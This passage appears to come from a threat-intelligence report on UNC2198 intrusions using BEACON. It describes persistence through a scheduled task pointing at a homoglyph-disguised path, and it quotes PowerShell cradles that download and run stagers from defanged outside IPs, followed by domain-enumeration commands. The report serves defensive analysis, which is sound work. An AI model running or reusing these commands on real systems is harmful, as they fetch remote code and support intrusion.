REG_DWORD /d 3809 & exit These example commands are non-functional, as they do not modify or alter payload execution.
Another technique involves installing BEACON using a file path containing mixed Unicode-escaped and ASCII characters to evade detection: Unicode Escaped C:\\ProgramData\\S\\u0443sH\\u0435\\u0430ls\\T\\u0430s\\u0441host.exe Unicode Unescaped
C:\\ProgramData\\SуsHеаls\\Tаsсhost.exe
The executable was then executed by using a Scheduled Task named shadowdev : cmd.exe /c schtasks /create /sc minute /mo
1 /tn shadowdev /tr
C:\\\\ProgramData\\\\S\\u0443sH\\u0435\\u0430ls\\\\T\\u0430s\\u0441host.exe While the previous examples are related to compiled executables, UNC2198 has also used simple PowerShell download cradles to execute Base64-encoded and compressed BEACON stagers in memory: powershell -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('hxxp://5.149.253[.]199:80/auth')) powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\"hxxp://185.106.122[.]167:80/a\")) powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('hxxp://195.123.233[.]157:80/casino'))\" Discovery and Reconnaissance UNC2198 has exhibited common TTPs seen across many threat groups during discovery and reconnaissance activities.
UNC2198 has used the BloodHound active directory mapping utility during intrusions from within the “ C:\\ProgramData ” and “ C:\\Temp ” directories.
The following are collective examples of various commands executed by UNC2198 over time to enumerate a compromised environment: arp -a whoami /groups whoami.exe  /groups /fo
csv whoami /all net user < Redacted > net groups \"Domain Admins\" /domain net group \"Enterprise admins\" /domain net group \"local admins\" /domain net localgroup \"administrators\" /domain
nltest /domain_trusts nltest /dclist:< Redacted > Lateral Movement and Privilege Escalation UNC2198 has used Windows Remote Management and RDP to move laterally between systems.
UNC2198 has also performed remote execution of BEACON service binaries on targeted systems to move laterally.
UNC2198 launches SMB BEACON using PowerShell, executing command lines such as the following: C:\\WINDOWS\\system32\\cmd.exe /b /c start /b /min
